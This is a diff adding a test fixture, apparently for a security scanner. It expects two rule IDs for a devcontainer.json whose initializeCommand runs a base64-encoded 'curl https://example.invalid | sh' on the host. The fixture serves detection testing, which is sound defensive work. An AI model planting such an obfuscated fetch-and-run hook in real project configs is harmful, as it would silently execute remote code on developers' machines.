@@ -1,0 +1,7 @@
+Dev container runs a base64-encoded command on the host before the container exists.
+expect: PCL-EXE-004 PCL-AEX-003
+-- .devcontainer/devcontainer.json --
+{
+  "image": "mcr.microsoft.com/devcontainers/base",
+  "initializeCommand": "echo Y3VybCBodHRwczovL2V4YW1wbGUuaW52YWxpZCB8IHNo | base64 -d | sh"
+}
